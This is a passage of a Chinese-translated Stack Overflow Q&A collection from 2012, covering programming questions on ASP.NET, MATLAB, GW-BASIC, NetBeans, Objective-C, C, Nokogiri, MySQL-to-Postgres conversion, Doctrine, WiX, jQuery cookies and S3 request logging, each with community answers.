        To learn more about ASP.NET MVC visit <a href="http://asp.net/mvc" title="ASP.NET MVC Website">http://asp.net/mvc</a>.
    </p>

</asp:Content> 
```

这给了我以下错误：

```
Only Content controls are allowed directly in a content page that contains Content controls. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:35:22.843

只需从旧索引页面复制并粘贴到新索引页面（或复制并粘贴脚本 src 参考）。这与 ASP 完全无关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:57:31.207

包括 jquery 到您的页面的链接（**在**您使用 jquery 的代码之前）...

`<script type="text/javascript" src="http://code.jquery.com/jquery-1.8.1.min.js"></script>`

如果您使用母版页，请将其添加到那里，因此所有页面都已包含它。然后，您只需要按原样复制代码即可。

# matlab - 在 MATLAB 中生成要保存在 .mif 文件中的正弦波

> ID：12427605
> 
> 赞同：0
> 
> 时间：2012-09-14T15:29:12.823
> 
> 标签：matlab, wave, sample, trigonometry

我正在尝试生成`500Hz`前 5 秒的正弦波，然后`1000Hz`将其保存`.mif`在 MATLAB 中的文件中。这是我将用于将数据保存到`.mif`文件的通用代码，但我不确定如何正确生成正弦波样本，以便它们可以包含在此代码中。采样频率将为`2000Hz`。

谢谢你。

```
fid = fopen('filename.mif','w');

fprintf(fid,'WIDTH=16;\n');

fprintf(fid,'DEPTH=256;\n');

fprintf(fid,'ADDRESS_RADIX=UNS;\n');

fprintf(fid,'DATA_RADIX=DEC;\n');

fprintf(fid,'CONTENT BEGIN\n');

for k = 1:256

  fprintf(fid,'%i : %i;\n',k-1,data(k));

end

fprintf(fid,'END;');

fclose(fid); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:56:49.627

这会做到这一点，但我不确定你会喜欢结果：

```
aa = 0:(1/2000):5;
aa = aa(1:end-1);
bb = (0:(1/2000):10) + 5;
t = [ aa bb];
y1 = sin(2*pi*500*aa);
plot( aa, y )
y2 = sin(2*pi*1000*bb);
y = [y1 y2] 
```

您会发现，500 Hz 信号的采样速度几乎不足以获得高、低和零交叉。2000 Hz 是一团糟，因为需要采样大于两倍的信号带宽。这是作业吗？对我来说无所谓，只是好奇。

# variables - GW Basic 默认变量初始化

> ID：12427607
> 
> 赞同：0
> 
> 时间：2012-09-14T15:29:21.797
> 
> 标签：variables, gw-basic

我正在使用遗留代码，并且在查找 GW Basic 的教程和手册几天后遇到了一些我无法解释的问题：在第 530 行的比较中使用了一个变量 (P9%) (IF P9 % <> 0) 之前代码将在第 860 行达到其定义。这不是一段复杂的代码，总共只有约 1200 行，所以我相信我没有错过任何 goto 或 gosub 或任何会达到 860在这个比较之前。

我很好奇这在程序运行时是如何影响程序的。我的大部分经验是在 c++ 中这种东西无法编译，如果它编译了，一个未分配的变量可能包含任何适合的东西，但我不知道在 Basic 中为变量赋予了什么样的默认赋值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-11T05:43:01.757

自从我在 gwbasic 中写了很多东西以来已经有很多年了！

如果我没记错的话，在这种情况下，变量被分配了一个零值。Gwbasic（我认为是 Qbasic）在第一次引用时为所有变量分配一个默认值，这通常是零或字符串变量的空字符串。

有趣的是，当使用 DIM 语句创建数组时，数组中的所有项也都以这种方式初始化。

即使使用这种机制，通常最好初始化一个变量，只是为了清楚发生了什么。

为 gwbasic 编写的那个时代的许多程序员尽可能多地省略，以尽量减少程序指令使用的内存量，以便他们有更多的东西用于其他东西。所以这可能就是它没有初始化的原因。

# templates - NetBeans 模板提示用户输入变量

> ID：12427615
> 
> 赞同：2
> 
> 时间：2012-09-14T15:29:40.050
> 
> 标签：templates, netbeans

我正在上大学的编程课，我的教授要求我在特定格式的 JavaDoc 注释块中包含有关作业的信息。我想创建一个 java 类模板，这样当我创建文件时，我只需输入分配特定信息，并将其放置在模板中。这是可能的，还是 netbeans 模板中使用的变量必须预先定义？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-01T01:49:19.847

“我想要用户在 netbeans 中创建 .java 文件时生成的注释。”

然后，您最好的解决方案是修改模板并在需要时定义自定义 User.properties。

在 NetBeans 7.2（我认为是最新的）中，转到 [*工具*] -> [*模板*]，然后在*模板管理器*窗口中，您可以为您喜欢的任何语言展开任何模板并对其进行自定义。

例如，如果您展开*Java* ，则可以通过突出显示 Java 类并选择 [*在编辑器中打开*] 来更改*Java 类*。此时，您可以轻松地在顶部看到普通的 javadoc 注释块。

 *```
/**
 *
 * @author ${user}
 * @professor Mr. LordZardeck's Professor
 */
public class ${name} {

} 
```

如果要添加自定义属性，如上面使用*用户*属性，在*模板管理器*窗口中，选择 [*设置*]。这将打开**User.properties**文件，您可以在其中添加自己的属性。如果你看文件的底部，最后一行被注释掉了，但它是一个自定义属性的例子，没有**注释**的是：

```
user=Your Name <your.name at your.org> 
```

因此，您可以通过简单地更改模板（如添加到 java 类模板中的教授标签）来指定无需任何工作即可自动创建的静态标签。对于变量可能在分配之间变化的标签，您可以使用自定义用户属性在每次分配开始时分配这些属性，然后模板将在您的模板时自动将您的分配信息填充到自动生成的自定义 javadoc 标签中被打开。*

# iphone - NSDictionary 保留崩溃

> ID：12427636
> 
> 赞同：2
> 
> 时间：2012-09-14T15:30:52.463
> 
> 标签：iphone, memory-management, nsdictionary

我有一个 NSDictionary，通过解析存储值。我在`-viewDidLoad`. 并访问`-viewWillAppear`. 它工作得很好。

然后，我`UIPageControl`与`UIScrollView`. 滚动时`UIScrollView`，我再次访问同一个字典，它崩溃说

`[CFString respondToSelector:]: send to deallocated....`

```
- (void) viewDidLoad {

    [super viewDidLoad];
    scoresDict = [[NSDictionary alloc] initWithDictionary:[scoreObj scores]];
}

- (void)loadScrollViewWithPage:(int)page {

    if (page < 0) 

        return;

    if (page >= kNumberOfPages)

    return;

    NSLog(@“scoresDict %@”,scoresDict);
} 
```

我尝试`retain`在相同的功能中使用，但没有成功。而且`copy`，它也没有奏效。任何帮助，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T18:25:15.477

您没有这么说，但看起来所有这些方法都是从您的自定义 UIViewController 或 UIScrollViewController 子类的实例中调用的。

最可能的问题是该实例本身没有被保留。

当您第一次从 nib 加载视图时，-viewDidLoad 和 -viewWillAppear 都会被调用。但是，垃圾收集可能发生在这些调用和您对 -loadScrollViewWithPage 的调用之间，并且没有对象与视图控制器实例本身有任何连接。

如果是这种情况，在 scoreDict 上使用复制或保留将无法解决问题。您需要确保复制或保留视图控制器实例本身。找出需要保留视图控制器的对象并确保它被保留。

一种快速测试这是否是问题的方法：在您的应用程序委托中创建一个“myViewController”属性。在 viewDidLoad 中，添加一行：

```
[[[UIApplication sharedApplication] delegate] setMyViewController:self]; 
```

如果这解决了您的问题，则意味着问题在于视图控制器被释放。但这并不意味着这是您的最佳解决方案，但这只是一种诊断。您需要弄清楚什么应该保留您的视图控制器并确保它这样做。

# c - 用数组在 C 中创建 switch 语句？

> ID：12427641
> 
> 赞同：2
> 
> 时间：2012-09-14T15:31:09.030
> 
> 标签：c, arrays, switch-statement

我正在尝试制作一个 switch 语句，它将一个单词放入一个数组中，然后通过 switch 语句抛出每个字母，并根据它是哪个字母为每个字母分配一个点，并为该单词提供一个最终点值，我似乎无法正确处理数组部分。任何帮助，将不胜感激！

```
int main(){
int letter_points = 0;
char word[7];
int word_length = 7;
int i;
printf("Enter a Word\n");
scanf("%s", word);
for(i = 0; i < word_length; i++){

switch(word){
    //1 point
    case 'A':
    case 'E':
    case 'I':
    case 'L':
    case 'N':
    case 'O':
    case 'R':
    case 'S':
    case 'T':
    case 'U':
        letter_points++;
        break;
    //2 points
    case 'D':
    case 'G':
        letter_points += 2;
        break;
    //3 points
    case 'B':
    case 'C':
    case 'M':
    case 'P':
        letter_points += 3;
        break;
    //4 points
    case 'F':
    case 'H':
    case 'V':
    case 'W':
    case 'Y':
        letter_points += 4;
        break;
    //5 points
    case 'K':
        letter_points += 5;
        break;
    //8 points
    case 'J':
    case 'X':
        letter_points += 8;
        break;
    //10 points
    case 'Q':
    case 'Z':
        letter_points += 10;
        break;
}
}
printf("%d\n", letter_points);
return;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T15:33:24.380

有一个查找数组可能会更快：

```
int const letter_score[26] = { 1, 2, 1, 3, ..., 10 };
/*                      key:   A  B  C  D        Z    */

score += letter_score[c - 'A'];   // or "toupper(word[i]) - 'A'" 
```

警告：这需要大写字母连续排列的编码，例如 Unicode 或 ASCII。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T15:33:19.843

尝试使用这个

```
 switch(word[i]){ 
```

在 switch 语句中。就目前而言，即使您正在迭代数组的范围，您也不会测试数组中的每个元素。话虽如此，我会采用 Kerrek SB 在另一个答案中建议的方法。这更整洁，更紧凑。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-14T15:33:28.967

变量`word`是一个数组，但你想`switch`在每个字符上。因此，您需要：

```
switch(word[i]) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T15:36:13.963

在 C 中，您不能在`switch`( 和表达式`case`) 中使用数组。此外，传递给的`switch()`类型和每个中指定的类型`case`必须匹配。所以你能做的最多就是打开一个角色。不过，您几乎做对了，只是您将整个数组传递给 switch。改为使用索引来引用字符。例如：

```
switch (word[i]) {
 ...
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-25T11:26:20.303

你有一个大小为 7 的数组，你不能打开数组，你必须在数组的每个字符上切换，所以使用： switch(word[i])

# xml - Nokogiri：检查命名空间是否存在

> ID：12427646
> 
> 赞同：0
> 
> 时间：2012-09-14T15:31:40.747
> 
> 标签：xml, nokogiri

对给定视频的 Youtube gdata API 进行正常查询，如下所示：

[http://gdata.youtube.com/feeds/api/videos?q=H-x7UumBaFs](http://gdata.youtube.com/feeds/api/videos?q=H-x7UumBaFs)

返回如下结果：

```
<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" xmlns:openSearch="http://a9.com/-/spec/opensearchrss/1.0/" xmlns:yt="http://gdata.youtube.com/schemas/2007">
<!-- data -->
<entry>
<!-- data -->
<gd:rating average="3.2309198" max="5" min="1" numRaters="511" rel="http://schemas.google.com/g/2005#overall"/>
</entry>
</feed> 
```

但是有时 gd:rating 线不存在。

如果存在，我想从该行读取数据。我试图通过以下方式检查：

```
if node.at_xpath(".//gd:rating/@numRaters") 
```

但这不起作用，给出错误“未定义的命名空间前缀：.//gd:rating/@numRaters”

你知道我如何在读取之前检查 gd:rating 命名空间的存在吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T19:12:54.160

感谢[这个问题](https://stackoverflow.com/questions/4690737/nokogiri-xpath-namespace-query)和[Nokogiri 文档](http://www.nokogiri.org/Nokogiri/XML/Node.html#method-i-xpath)，这是对我有用的解决方案：

```
gd_namespace = {"xmlns:gd" => "http://schemas.google.com/g/2005"}

...

s.num_raters = node.at_xpath('.//gd:rating/@numRaters', gd_namespace).try(:text) 
```

# c++ - 工厂函数返回 const

> ID：12427647
> 
> 赞同：0
> 
> 时间：2012-09-14T15:31:59.533
> 
> 标签：c++

我有一个基于丑陋容器创建容器的工厂

```
template<class T>
std::vector<T> containerFactory(const UglyContainer* uglyContainer)
{
    std::vector<T> container(uglyContainer->count);
    Getter getter;
    for(unsigned int i=0;i<uglyContainer->count;++i)
    {
        getter(container[i], uglyContainer->values[i]);
    }
    return container;
} 
```

我该如何使用返回 const std::vector 的工厂函数来补充 containerFactory？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:49:44.517

返回向量上的 const 无关紧要。由于是按值返回的，所以会被复制，const 会应用到复制的使用上。

由于您在工厂方法中在堆栈上创建向量，因此无法通过引用返回向量。

作为容器工厂的健壮性问题，您可以考虑将向量作为工厂方法的参数并附加到它以避免向量的副本。

# mysql - MySQL to Postgres conversion

> ID：12427648
> 
> 赞同：2
> 
> 时间：2012-09-14T15:32:01.830
> 
> 标签：mysql, ruby-on-rails, ruby, postgresql

Does anyone know what could be causing this error? I'm trying to convert a MySQL site to Postgres so I can host on Heroku. I'm new to database syntax, and this problem has been bugging me for days.

```
PG::Error: ERROR:  syntax error at or near "ON"
LINE 1: ...tores ("key", "value") VALUES ('traffic:hits', 0) ON DUPLICA...
                                                             ^ 
```

Here's the github page for the site I'm trying to convert. [https://github.com/jcs/lobsters](https://github.com/jcs/lobsters)

This is the query. I added the backslash double quotes in replace of `.

```
if Rails.env == "test"
  Keystore.connection.execute("INSERT OR IGNORE INTO " <<
    "#{Keystore.table_name} (\"key\", \"value\") VALUES " <<
    "(#{q(key)}, 0)")
  Keystore.connection.execute("UPDATE #{Keystore.table_name} " <<
    "SET \"value\" = \"value\" + #{q(amount)} WHERE \"key\" = #{q(key)}")
else
  Keystore.connection.execute("INSERT INTO #{Keystore.table_name} (" +
    "\"key\", \"value\") VALUES (#{q(key)}, #{q(amount)}) ON DUPLICATE KEY " +
    "UPDATE \"value\" = \"value\" + #{q(amount)}")
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:56:58.973

Postgres'[`INSERT`](http://www.postgresql.org/docs/current/static/sql-insert.html)不支持 MySQL 的 variant [`INSERT ... ON DUPLICATE KEY UPDATE`](http://dev.mysql.com/doc/refman/5.5/en/insert-on-duplicate.html)。

有关替代方案，请参阅[此问题](https://stackoverflow.com/questions/1109061/insert-on-duplicate-update-postgresql)的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-27T21:53:50.580

昨晚我正在研究这个确切的代码，这是我如何修复它的初步看法，遵循这个[答案](https://stackoverflow.com/a/6527838/314780) ：

```
def self.put(key, value)
key_column = Keystore.connection.quote_column_name("key")
value_column = Keystore.connection.quote_column_name("value")

if Keystore.connection.adapter_name == "SQLite"
  Keystore.connection.execute("INSERT OR REPLACE INTO " <<
    "#{Keystore.table_name} (#{key_column}, #{value_column}) VALUES " <<
    "(#{q(key)}, #{q(value)})")

elsif Keystore.connection.adapter_name == "PostgreSQL"
  Keystore.connection.execute("UPDATE #{Keystore.table_name} " +
    "SET #{value_column} =#{q(value)} WHERE #{key_column} =#{q(key)}")
  Keystore.connection.execute("INSERT INTO #{Keystore.table_name} (#{key_column}, #{value_column}) " +
    "SELECT #{q(key)}, #{q(value)} " +
    "WHERE NOT EXISTS (SELECT 1 FROM #{Keystore.table_name} WHERE #{key_column} = #{q(key)}) "
    )

elsif Keystore.connection.adapter_name == "MySQL" || Keystore.connection.adapter_name == "Mysql2"
  Keystore.connection.execute("INSERT INTO #{Keystore.table_name} (" +
    "#{key_column}, #{value_column}) VALUES (#{q(key)}, #{q(value)}) ON DUPLICATE KEY " +
    "UPDATE #{value_column} = #{q(value)}")

else
  raise "Error: keystore requires db-specific put method."

end

true
end 
```

除了为了 postgres 兼容性之外，在 lobsters 代码库中还有很多东西需要修复——在其他控制器文件中找到了 mysql 特定的东西。我目前正在[https://github.com/seltzered/journaltalk](https://github.com/seltzered/journaltalk)我自己的龙虾叉上处理它们- postgres 修复应该在未来一两天内提交。

# mysql - 本机 sql 到 Doctrine_RawSql

> ID：12427649
> 
> 赞同：2
> 
> 时间：2012-09-14T15:32:11.103
> 
> 标签：mysql, doctrine, doctrine-1.2

我有这个 SQL 查询。

```
SELECT
    c.id, 
    c.name,
    c.slug,
    sc.id,
    sc.name,
    sc.slug,
    COUNT(bsc.id) AS business_count
FROM
    fi_category c
LEFT JOIN
    fi_subcategory sc ON c.id = sc.category_id AND (sc.deleted_at IS NULL)
LEFT JOIN (
        fi_business b
    INNER JOIN
        fi_business_subcategory bsc ON b.id = bsc.business_id AND (bsc.deleted_at IS NULL)
    INNER JOIN
        fi_suburb su ON su.id = b.suburb_id AND su.city_id = 1
    ) ON sc.id = bsc.subcategory_id
WHERE 
    (c.deleted_at IS NULL) 
GROUP BY 
    c.id, sc.id 
```

因为 DQL 不支持这种类型的查询。我想用它`Doctrine_RawSql`

我试过用这种方式。

```
$q = new Doctrine_RawSql();
$q->select('{c.name}, {c.slug}, {sc.name}, {sc.slug}, {COUNT(bsc.id) AS business_count}');
$q->from('fi_category c LEFT JOIN fi_subcategory sc ON c.id = sc.category_id AND (sc.deleted_at IS NULL) LEFT JOIN (fi_business b INNER JOIN fi_business_subcategory bsc ON b.id = bsc.business_id AND (bsc.deleted_at IS NULL) INNER JOIN fi_suburb su ON su.id = b.suburb_id AND su.city_id = 1) ON sc.id = bsc.subcategory_id');
$q->groupBy('GROUP BY c.id, sc.id');
$q->addComponent('c', 'Model_Category c');
$q->addComponent('sc', 'c.Subcategory sc');
$q->addComponent('bsc', 'sc.BusinessSubcategory bsc');
$q->addComponent('b', 'bsc.Business b');
$q->addComponent('su', 'b.Suburb su');
$q->execute(); 
```

此查询不起作用，这是`Doctrine_Rawsql`为上述 SQL 查询构建的正确方法吗？

如果有人想检查这里的表格是小提琴[http://sqlfiddle.com/#!2/5adaa的链接](http://sqlfiddle.com/#!2/5adaa)

**更新：**这是这个问题的延续， 如果有人可以通过使用@MvG 提供的解决方案中的任何查询来帮助我构建，请[根据条件选择查询和计数](https://stackoverflow.com/questions/12418335/select-query-and-count-based-on-condition)`Doctrine_Rawsql`

# c# - .net mvc 在子表单保存完成时在强类型父视图中显示“已保存”消息

> ID：12427650
> 
> 赞同：1
> 
> 时间：2012-09-14T15:32:12.810
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3

我有一个可以包含评论对象的博客对象。

目前，博客包含博客信息以及呈现评论列表和添加新评论的表单的部分内容。此评论表单发布到`Save`我的`Comment`控制器中的操作，然后重定向回控制器的`Show`操作`Blog`。下面的代码是动作动作。

```
 //the id of the blog this comment is for
        int blogId;
        bool parsed = Int32.TryParse(Request.Form["blogId"].ToString(), out blogId);

        //get the blog
        BlogService blogService = new BlogService(unitOfWork);
        Blog blog = new Blog();

        if (parsed)
        {
            blog = blogService.GetBlogArticle(blogId);
        }

        //setup up our comment
        CommentService service = new CommentService(unitOfWork);
        Comment comment = model;
        comment.Blog = blog;

        //set the comment date
        comment.PostedDate = DateTime.Now;

        bool actionSucceeded = true;
        string errorMessage = "Something went wrong. Please try your request again.";

        try
        {
            service.Add(comment);
            unitOfWork.Save();  
        }
        catch
        {
            actionSucceeded = false;
        }

        if (actionSucceeded)
        {
            TempData["ActionMessage"] = "Comment successfully added. Comments need approval before being posted.";
            return RedirectToAction("show", "blog", new { id = comment.Blog.Id });
        }
        else
        {
            ModelState.AddModelError(string.Empty, errorMessage);
        }

        return RedirectToAction("show", "blog", new { id = comment.Blog.Id }); 
```

我的评论视图模型是这样设置的。

```
public class CommentListModel
{
    public IEnumerable<Comment> Comments { get; set; }
    public string ActionMessage { get; set; }
} 
```

我的博客视图模型是这样设置的。

```
public class BlogModel : ResultsModel<Blog>
{
    public Blog Blog { get; set; }
    public string ActionMessage { get; set; }

    public BlogModel() : base()
    {
        this.ItemsPerPageOptions = new KeyValuePair<int, string>[]
        {
            new KeyValuePair<int, string>(15, "Items Per Page: 15"),
            new KeyValuePair<int, string>(20, "Items Per Page: 20"),
            new KeyValuePair<int, string>(25, "Items Per Page: 25"),
            new KeyValuePair<int, string>(30, "Items Per Page: 30"),
            new KeyValuePair<int, string>(40, "Items Per Page: 40"),
            new KeyValuePair<int, string>(50, "Items Per Page: 50")
        };
    }
} 
```

以及处理这个的视图部分。

```
 @if (TempData["ActionMessage"] != null)
        {   
            <div class="validation-summary-success" style="font-size: 2.1em; color: gray; background-color: #90EE90; padding: 10px; margin:2px;">
                <ul>
                    <li>@TempData["ActionMessage"]</li>
                </ul>
            </div>

            <script type="text/javascript">
                $(".validation-summary-success").delay(3000).fadeOut("slow").slideUp("slow");
            </script>   
        }

        <div class="Head">
          <h5>@Model.Blog.Title</h5>
          <label>By: @Model.Blog.Admin.Name <span>|  @Model.Blog.PostingDate.ToShortDateString()</span></label>
        </div>
        <article class="mContent">
            <p>@Model.Blog.Body</p>   
        </article>
        <div id="commentContainer">
                @Html.Partial("_BlogComments", @Model.Blog.Comments, new ViewDataDictionary { {"blogId", @Model.Blog.Id}  })
        </div> 
```

如您所见，我使用`TempDataDictionary`来显示“已保存”消息。但是，据我了解，这违背了拥有强类型视图的目的。

当我在操作中保存此评论时，如果我重定向回控制器的操作，如果此操作当前接受记录 ID `Save`，我该如何设置属性？我会设置博客或评论对象的属性吗？`ActionMessage``Show``Blog``ActionMessage`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:17:02.043

我会使用[Ajax 表单](http://msdn.microsoft.com/en-us/library/dd505086%28v=vs.108%29)来发布新评论并获取状态消息。没有必要为单个评论更新重新发送整个页面，对吧？看起来您甚至可以将状态消息作为文本返回，并使用[UpdateTargetId](http://msdn.microsoft.com/en-us/library/system.web.mvc.ajax.ajaxoptions.updatetargetid%28v=vs.108%29)更新状态字段。

```
@using Ajax.BeginForm("Save", "Comment", new AjaxOptions() {
    HttpMethod = "POST",
    UpdateTargetId = "StatusContainer",
    OnSuccess = "FadeOutStatus",
}) {
    <input type='submit' value='Add Comment' />
}

<div class="validation-summary-success" style="display: none; font-size: 2.1em; color: gray; background-color: #90EE90; padding: 10px; margin:2px;">
    <ul>
        <li><span id="StatusMessage"></span></li>
    </ul>
</div>

<script type="text/javascript">
    $(".validation-summary-success").fadeIn().delay(3000).fadeOut("slow").slideUp("slow");
</script> 
```

（以上内容未经测试，仅供参考。）

# c# - 如何从 Screen 类中获取屏幕标识号

> ID：12427651
> 
> 赞同：5
> 
> 时间：2012-09-14T15:32:19.283
> 
> 标签：c#

我需要通过其标识号在屏幕中显示对话框，例如我有这种情况 ![windows上的屏幕设置](../Images/97332ce4025008438576eb09af3395c0.png)

我想在第四个显示一些东西，当我使用 Screen.AllScreens 获取所有屏幕时，我的第四个屏幕是数组中的 0 元素，因为 AllScreens 不是按缩进数而是按顺序返回屏幕。所以也许有人知道如何从 Screen 类中获取标识号，或者如何通过其标识号获取屏幕坐标和边界。

更新：

DeviceName 并不总是与标识号相对应（见下图）：

![在此处输入图像描述](../Images/b1ab37bb304f8e584349a39ed1e93e67.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:55:58.287

如果你看`screen.DeviceName`你应该得到`\\\\.\\DISPLAY1`，`\\\\.\\DISPLAY2`等等。你可以用它来搜索`\\\\.\\DISPLAY4`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-19T07:07:50.703

获取屏幕编号（肮脏的方式，但它有效）：

```
 var sceenId = -1;
 var targetScreen = Screen.FromPoint(Cursor.Position);
 for (var i = 0; i < Screen.AllScreens.Length; i++)
 {
     if (!Equals(targetScreen, Screen.AllScreens[i]))
         continue;
     sceenId = i;
     break;
 } 
```

通过标识号获取屏幕坐标和边界：

`Screen.AllScreens[sceenId].Bounds`

# uiviewcontroller - 连接文件以查看时的 SIGABRT

> ID：12427652
> 
> 赞同：0
> 
> 时间：2012-09-14T15:32:23.180
> 
> 标签：uiviewcontroller, connect, sigabrt

我是 Pim Praat，一位年轻的应用程序开发人员。

目前我有一个大问题，当我将我的 Viewcontroller 连接到一个视图时，我得到了 sigabrt 错误。我能做些什么来解决它？？？

亲切的问候，

皮姆普拉特

# wix - 将服务器上已安装的 SSL 证书分配给带有 WiX iis:Certificate 扩展的 https 绑定？

> ID：12427654
> 
> 赞同：3
> 
> 时间：2012-09-14T15:32:26.787
> 
> 标签：wix, windows-server-2008, iis-7.5, ssl-certificate, wix3.6

我正在尝试在 Windows Server 2008R2 和 WiX 3.6（稳定）上部署一些具有安全绑定的 MVC4 Web 应用程序

我拼命想让它工作，而不是求助于编写后续的 powershell 脚本或我自己的自定义操作。

WiX iis:Certificate 扩展想要先为我安装证书，然后我才能使用它。这在生产环境中是行不通的。安装程序在任何时候都无法使用 .cer 或 .pfx 格式的证书。它已经部署在 localMachine/my 商店中的目标机器上，当您使用 IIS7 管理单元手动安装时，您通常会去那里。我希望安装程序能够通过提供以下任何内容来引用它：指纹、友好 id 或者可能找到它与网站主机头绑定模式匹配。

有没有什么方法可以在构建时或安装时在没有原始 .pfx 文件和密码的情况下在 WiX 脚本中引用预安装的证书？（我让最后两个场景在测试中运行良好，但这不是客户想要的）。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-07-07T17:17:24.763

我对你有类似的要求，所以我写了一篇关于它的帖子：http: [//manyrootsofallevilrants.blogspot.co.uk/2013/07/assign-certificate-set-https-binding.html](http://manyrootsofallevilrants.blogspot.co.uk/2013/07/assign-certificate-set-https-binding.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T21:32:57.097

好吧，自从我发布这个以来已经有一段时间了。

从那以后，我继续使用它并用 C# 编写了一个自定义操作来完成繁重的工作。Powershell 似乎没有让我控制我需要的故障模式。

我无法发布代码 - 因为它属于我的客户，但我可以说我使用 Microsoft.Web.Administration 的方式与以下问题中描述的方式类似：[Programatically Import Cert Into IIS](https://stackoverflow.com/questions/4498291/programatically-import-cert-into-iis)。我希望这会有所帮助。这不是我想要的答案，但它确实解决了问题。

# jquery - 更改 jquery cookie 的值

> ID：12427656
> 
> 赞同：0
> 
> 时间：2012-09-14T15:32:33.440
> 
> 标签：jquery, cookies

当用户以唯一值（任何“hdflashfafafxx233ddd”）登陆我的网站时，会立即删除持久性 cookie (x1st)。

此 cookie 用于跟踪，但如果用户选择不跟踪 cookie，我需要将此值设置为 0 - 我无法删除它，因为这是 cookie 不断重置。

然后，当用户选择重新加入时，我需要以 0 的值使 x1st 过期。

```
 //cookie set by server
  $.cookie('x1st', 'hdflashfafafxx233ddd', { path: '/', domain: mysite.co.uk });

  //changing value of cookie when user opts out 
  $.cookie('x1st', 0, {path: '/', domain: mysite.co.uk });

  //expire cookie when user opts back in 
  $.cookie('x1st', 0, { expires: -1 , path: '/', domain: mysite.co.uk }); 
```

问题是我无法将 x1st cookie 的值更改为 0

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:39:49.287

它需要是一个字符串值`'0'`。不是整数。Cookies 只存储字符串。

# asp.net - ASP.NET 记录对 Amazon S3 对象的请求

> ID：12427658
> 
> 赞同：1
> 
> 时间：2012-09-14T15:32:35.823
> 
> 标签：asp.net, amazon-s3, umbraco

我已将一些对象放入 S3 存储桶中，并且我想在每次客户端向其中一个对象发出请求时记录下来。

我使用 Umbraco 4.8 作为我的后端，并运行了一些自定义代码。

我提出的解决方案：

1.  将链接设置为从 S3 中提取对象并将其作为响应发送回的 ASP 页。我看到的问题是客户端必须等待 ASP 加载文件才能开始下载文件。

2.  将链接设置为记录请求并将 Response.Redirect 返回到 S3 对象的 ASP 页。对我来说，这似乎是不必要的重定向，客户端可能会缓存该重定向，并且下次访问该对象时不会访问我的服务器。

有没有人对如何实现这一目标有任何其他解决方案或想法？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T09:41:51.233

我会使用 jquery 和谷歌分析。向您要跟踪的每个链接添加一个类，然后使用 jquery 将 onclick 事件操作为：

```
<a href="[link]" onclick="__gaq.push(['_trackEvent', 's3-Bucket-Request', 's3-actual-bucket-name', 'current-page']);">link text</a> 
```

适当地替换三个变量（'s3-Bucket-Request'、's3-actual-bucket-name'、'current-page'）。如果然后将 jquery 放在每个页面的开头，那么您就有了一个可重用的功能。

开始：

```
<a href="[link]" class="ga">link text</a> 
```

jQuery：

```
$('.ga').attr("onclick", "__gaq.push(['_trackEvent', 's3-Bucket-Request', 's3-actual-bucket-name', 'current-page']);"); 
```

结尾：

```
<a href="[link]" class="ga" onclick="__gaq.push(['_trackEvent', 's3-Bucket-Request', 's3-actual-bucket-name', 'current-page']);">link text</a> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T22:03:52.143

根据您需要的准确程度，您也可以在客户端进行。使用 jQuery 等，向`a href`标签添加点击处理程序，向控制器发出 ajax 请求，记录活动。

# jquery - carouFredsel 缩略图实现和 IE7

> ID：12427662
> 
> 赞同：0
> 
> 时间：2012-09-14T15:32:44.047
> 
> 标签：jquery, css, internet-explorer-7, implementation

我已经在 Chrome、Firefox、IE9 和 8 中实现了 carouFredSel（带有下一个/上一个和分页的基本示例）。出于某种原因，尽管在查看 IE7 时，在我看来该插件没有正确触发。它只是显示列表下降，并没有将其放入隐藏的 oveflow 或下一个和上一个按钮将起作用的行。我在这里缺少什么吗？

我已经多次查看安装，还尝试在独立页面上的 IE7 上实现此功能，但无法实现。同样，我已经看透了配置和自定义事件以及 ie7 开发人员工具栏。似乎该插件没有在 IE7 上设置正确的东西，因为它确实创建了类/id 的 foo2 和 iamge_carousel。有没有人有不同的 IE7 来尝试以防它是我的 IE7 VHD 上的一些设置或帮助我指出正确的方向？

感谢您的时间。卡姆龙

编辑： [http ://www.kamsshowcase.com/stws-wp/?page_id=114](http://www.kamsshowcase.com/stws-wp/?page_id=114)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T19:56:43.293

查看源代码，您的条件注释不正确。您需要在**IE**和**7**之间留一个空格。

你有：

```
<!--[if lte IE7]>
<link rel="stlesheet" type="text/css" href="http://www.kamsshowcase.com/stws-wp/wp-content/themes/stws/inc/style_ie6.css"></script<![endif]--> 
```

你需要：

```
<!--[if lte IE 7]>
<link rel="stlesheet" type="text/css" href="http://www.kamsshowcase.com/stws-wp/wp-content/themes/stws/inc/style_ie6.css"></script<![endif]--> 
```

# java - QueryDSL 中的多列

> ID：12427665
> 
> 赞同：6
> 
> 时间：2012-09-14T15:32:48.353
> 
> 标签：java, database, querydsl

